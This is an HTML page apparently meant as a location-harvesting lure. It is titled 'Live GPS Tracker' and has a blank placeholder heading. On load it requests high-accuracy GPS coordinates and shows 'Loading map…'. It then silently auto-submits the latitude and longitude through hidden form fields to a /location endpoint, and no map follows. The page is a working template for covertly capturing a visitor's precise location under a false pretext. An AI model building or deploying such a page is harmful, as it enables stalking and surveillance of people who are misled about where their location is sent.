<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Live GPS Tracker</title>

    <style>
      body {
        font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
          Roboto, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        background: #f0f2f5;
      }
      .container {
        background: white;
        padding: 2rem;
        border-radius: 14px;
        width: 90%;
        max-width: 380px;
        text-align: center;
        box-shadow: 0 6px 18px rgba(0, 0, 0, 0.12);
      }
      h2 {
        color: #1a73e8;
        margin-bottom: 8px;
      }
      p {
        font-size: 14px;
        color: #5f6368;
      }
      .loader {
        margin: 15px auto 0;
        width: 28px;
        height: 28px;
        border: 4px solid #eee;
        border-top: 4px solid #1a73e8;
        border-radius: 50%;
        animation: spin 1s linear infinite;
      }
      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }
    </style>
  </head>

  <body>
    <div class="container">
      <h2>Your ......</h2>
      <p id="status">Requesting location permission…</p>
      <div class="loader" id="loader"></div>

      <form id="locForm" method="POST" action="/location">
        <input type="hidden" name="lat" id="lat" />
        <input type="hidden" name="lng" id="lng" />
      </form>
    </div>

    <script>
      document.addEventListener("DOMContentLoaded", () => {
        getLocation();
      });

      function getLocation() {
        const status = document.getElementById("status");
        const loader = document.getElementById("loader");

        const options = {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0,
        };

        if (!navigator.geolocation) {
          status.innerText = "GPS not supported.";
          loader.style.display = "none";
          return;
        }

        navigator.geolocation.getCurrentPosition(
          (position) => {
            status.innerText = "Location found. Loading map…";
            document.getElementById("lat").value = position.coords.latitude;
            document.getElementById("lng").value = position.coords.longitude;

            setTimeout(() => {
              document.getElementById("locForm").submit();
            }, 800);
          },
          (error) => {
            loader.style.display = "none";
            status.innerText = "Location permission required.";
          },
          options
        );
      }
    </script>
  </body>
</html>
